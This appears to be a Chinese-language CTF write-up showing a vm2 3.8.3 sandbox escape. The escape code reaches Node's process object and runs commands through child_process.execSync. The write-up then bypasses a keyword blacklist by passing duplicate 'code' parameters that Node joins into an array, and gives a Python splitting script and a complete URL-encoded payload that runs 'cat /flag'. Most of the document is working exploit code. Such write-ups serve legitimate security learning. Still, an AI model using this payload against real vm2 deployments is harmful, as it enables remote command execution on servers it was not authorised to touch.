Github 中 vm2 模块的 issue 中给出了 3.8.3 版本的沙箱逃逸

[vm2 issus](https://github.com/patriksimek/vm2/issues/225)，由此可知以下代码可以完成沙箱逃逸

```
const {VM} = require('vm2');
const untrusted = '(function(){
	TypeError.prototype.get_process = f=>f.constructor("return process")();
	try{
		Object.preventExtensions(Buffer.from("")).a = 1;
	}catch(e){
		return e.get_process(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
	}
})()'; 
try{
	console.log(new VM().run(untrusted));
}catch(x){
	console.log(x);
}
```

源代码中存在黑名单，而 node.js 存在一个特性，传入多个同名参数最终能组成一个数组。

```
?id=1&id=2
# id [1,2]
```

filter 函数存在缺陷，判断数组时使用的是 toString 方法，而 return 的是 join() 方法，因此可以在关键词处分割并利用以上特性传入，可以绕过黑名单。

```
s = '''(function(){
	TypeError.prototype.get_process = f=>f.constructor("return process")();
	try{
		Object.preventExtensions(Buffer.from("")).a = 1;
	}catch(e){
		return e.get_process(()=>{}).mainModule.require("child_process").execSync("cat /flag").toString();
	}
})()'''

blacklist = ['function', 'Error', 'prototype', 'process', 'constructor', 'return',
                'Buffer', 'try', 'catch', 'require', 'exec']

for b in blacklist:
    s = s.replace(b, b[:1] + ',' + b[1:])

print(s)
```

将得到的字符串放进 burp decoder 中 url 编码，将 ``%2c`` 替换为 ``&code=``，前面加上``?code=``

```
?code=%28%66&code=%75%6e%63%74%69%6f%6e%28%29%7b%0a%20%20%20%20%20%20%20%20%54%79%70%65%45&code=%72%72%6f%72%2e%70&code=%72%6f%74%6f%74%79%70%65%2e%67%65%74%5f%70&code=%72%6f%63%65%73%73%20%3d%20%66%3d%3e%66%2e%63&code=%6f%6e%73%74%72%75%63%74%6f%72%28%22%72&code=%65%74%75%72%6e%20%70&code=%72%6f%63%65%73%73%22%29%28%29%3b%0a%20%20%20%20%20%20%20%20%74&code=%72%79%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%4f%62%6a%65%63%74%2e%70%72%65%76%65%6e%74%45%78%74%65%6e%73%69%6f%6e%73%28%42&code=%75%66%66%65%72%2e%66%72%6f%6d%28%22%22%29%29%2e%61%20%3d%20%31%3b%0a%20%20%20%20%20%20%20%20%7d%63&code=%61%74%63%68%28%65%29%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%72&code=%65%74%75%72%6e%20%65%2e%67%65%74%5f%70&code=%72%6f%63%65%73%73%28%28%29%3d%3e%7b%7d%29%2e%6d%61%69%6e%4d%6f%64%75%6c%65%2e%72&code=%65%71%75%69%72%65%28%22%63%68%69%6c%64%5f%70&code=%72%6f%63%65%73%73%22%29%2e%65&code=%78%65%63%53%79%6e%63%28%22%63%61%74%20%2f%66%6c%61%67%22%29%2e%74%6f%53%74%72%69%6e%67%28%29%3b%0a%20%20%20%20%20%20%20%20%7d%0a%7d%29%28%29
```

